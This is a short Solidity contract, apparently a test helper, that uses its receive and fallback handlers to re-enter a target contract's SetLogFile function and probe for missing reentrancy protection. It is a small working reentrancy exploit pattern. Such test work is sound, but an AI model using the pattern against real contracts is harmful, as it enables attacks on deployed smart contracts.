// Minimal adversarial helper: tries to re-enter C.SetLogFile during its fallback/receive depending on a flag.
contract MaliciousAttacker {
    address public target;
    bool public doReenter;
    bool public alreadyCalled;

    constructor(address _target, bool _doReenter) payable {
        target = _target;
        doReenter = _doReenter;
        alreadyCalled = false;
    }

    // When C calls methods on this contract (it expects an address for LogFile), the attacker will try to call back
    // into C.SetLogFile to exploit missing reentrancy protection. We use receive() to catch payable interactions and fallback otherwise.
    receive() external payable {
        _attemptReenter();
    }
    fallback() external payable {
        _attemptReenter();
    }

    function _attemptReenter() internal {
        if (doReenter && !alreadyCalled) {
            alreadyCalled = true;
            // re-enter SetLogFile and set LogFile to this contract address again (or could be another)
            // We call without value.
            (bool s, ) = target.call(abi.encodeWithSignature("SetLogFile(address)", address(this)));
            s; // ignore result
        }
    }
}

